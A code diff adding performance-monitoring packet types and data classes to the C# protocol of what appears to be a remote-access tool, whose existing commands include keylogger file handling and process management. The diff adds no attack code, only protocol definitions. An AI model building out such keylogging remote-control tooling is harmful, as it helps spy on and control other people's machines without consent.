@@ -105,7 +105,10 @@ public enum PacketType
     KeyloggerDeleteFile  = 179,  // server→client: {Filename}
 
     // Hardware Stats (sent periodically by client alongside heartbeat)
-    HardwareStats = 36,   // client→server: {CpuUsage, RamUsed, RamTotal}
+    HardwareStats     = 36,   // client→server: {CpuUsage, RamUsed, RamTotal}
+    PerfMonStart      = 37,   // server→client: start streaming perf data at interval
+    PerfMonStop       = 38,   // server→client: stop streaming
+    PerfMonData       = 39,   // client→server: {CpuUsage, RamUsed, RamTotal, NetworkSentKB, NetworkRecvKB}
 
     // Process Manager
     ProcGetList    = 190,  // server→client: request process list
@@ -504,6 +507,16 @@ public class HardwareStatsData
     public float  CpuUsage  { get; set; }   // 0-100 %
     public long   RamUsed   { get; set; }   // MB
     public long   RamTotal  { get; set; }   // MB
+}
+
+public class PerfMonStartData { public int IntervalMs { get; set; } = 1000; }
+public class PerfMonData
+{
+    public float CpuUsage      { get; set; }
+    public long  RamUsed       { get; set; }   // MB
+    public long  RamTotal      { get; set; }   // MB
+    public long  NetworkSentKB { get; set; }   // KB/s
+    public long  NetworkRecvKB { get; set; }   // KB/s
 }
 
 // ── Process Manager (extended) ────────────────────────
